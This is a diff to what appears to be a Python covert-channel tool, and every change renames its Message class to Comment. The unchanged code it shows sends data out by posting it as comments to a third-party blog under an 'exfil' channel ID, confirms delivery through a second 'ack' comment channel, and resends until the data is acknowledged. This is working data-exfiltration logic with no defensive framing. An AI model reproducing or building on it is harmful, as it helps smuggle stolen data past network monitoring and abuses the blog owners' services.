@@ -23,9 +23,9 @@ class ReceiveConfig:
     process_time_slot = None
     prev_unapproved_index = None
 
-class Message:
-    message = None
-    message_id = None
+class Comment:
+    comment = None
+    comment_id = None
 
 class Channel:
     target_blog = None
@@ -186,25 +186,25 @@ def send_data(channel, data, send_config):
     while True:
         delay_to_timeslot(send_config.send_time_slot)
 
-        log_print("[INFO] send_data: Sending data " + str(data.message_id) + " at " + str(datetime.datetime.now().time()), 2)
+        log_print("[INFO] send_data: Sending data " + str(data.comment_id) + " at " + str(datetime.datetime.now().time()), 2)
 
-        response = submit_comment(channel.target_blog, channel.exfil_channel_id, data.message)
+        response = submit_comment(channel.target_blog, channel.exfil_channel_id, data.comment)
         if response.html_response_code == 409:
             log_print("## " + str(response.html_response))
-            log_print("## " + str(data.message_id) + ", " + str(data.message))
+            log_print("## " + str(data.comment_id) + ", " + str(data.comment))
             
         log_print("## send_data: " + str(response.html_response_code) + ", " + str(response.url) + ", " + str(response.moderation_hash), 2)
 
         if send_config.confirm_time_slot:
             delay_to_timeslot(send_config.confirm_time_slot)
             
-            response = response = submit_comment(channel.target_blog, channel.ack_channel_id, data.message_id)
+            response = response = submit_comment(channel.target_blog, channel.ack_channel_id, data.comment_id)
             if "Duplicate" in response.html_response:
-                # If it's duplicated, that means that the server successfully got the message.
-                log_print("[INFO] send_data: Message submitted and confirmed.", 1)
+                # If it's duplicated, that means that the server successfully got the comment.
+                log_print("[INFO] send_data: Comment submitted and confirmed.", 1)
                 break
             else:
-                log_print("[INFO + " + str(datetime.datetime.utcnow()) + " ] send_data: Message was not received by server. Resending...", 1)
+                log_print("[INFO + " + str(datetime.datetime.utcnow()) + " ] send_data: Comment was not received by server. Resending...", 1)
         else:
             break
 
